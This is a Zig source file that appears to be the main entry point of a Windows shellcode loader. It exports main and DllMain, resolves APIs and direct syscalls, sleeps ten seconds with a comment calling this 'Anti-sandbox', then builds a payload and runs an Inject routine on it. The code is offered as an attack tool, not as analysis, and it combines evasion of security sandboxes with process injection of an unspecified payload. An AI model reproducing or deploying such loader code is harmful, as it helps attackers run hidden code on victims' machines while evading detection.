const std = @import("std");
const windows = std.os.windows;
const Apis = @import("api.zig").Apis;
const Syscalls = @import("syscall.zig").Syscalls;
const Inject = @import("inject.zig").Inject;
const Payload = @import("payload.zig").Payload;
const win32 = @import("win32.zig");
const sleep = @import("helper/system.zig").sleep;

pub fn main() void {
    run();
}

pub export fn DllMain(
    hinstDLL: windows.HINSTANCE,
    fdwReason: windows.DWORD,
    lpvReserved: ?*anyopaque,
) callconv(windows.WINAPI) windows.BOOL {
    _ = hinstDLL;
    _ = lpvReserved;

    switch (fdwReason) {
        win32.DLL_PROCESS_ATTACH => {
        },
        win32.DLL_PROCESS_DETACH => {},
        win32.DLL_THREAD_ATTACH => {},
        win32.DLL_THREAD_DETACH => {},
        else => {},
    }

    return windows.TRUE;
}

pub export fn run() void {
    var apis = Apis{};
    if (!apis.get()) return;

    asm volatile ("nop" ::: "memory");

    var syscalls = Syscalls{};
    if (!syscalls.get(&apis)) return;
    
    asm volatile ("nop" ::: "memory");

    sleep(syscalls, 10000); // Anti-sandbox

    var payload = Payload.init(apis, syscalls) catch return;
    defer payload.deinit(syscalls);
    Inject.run(apis, syscalls, payload.buffer[0..payload.size]) catch return;
}
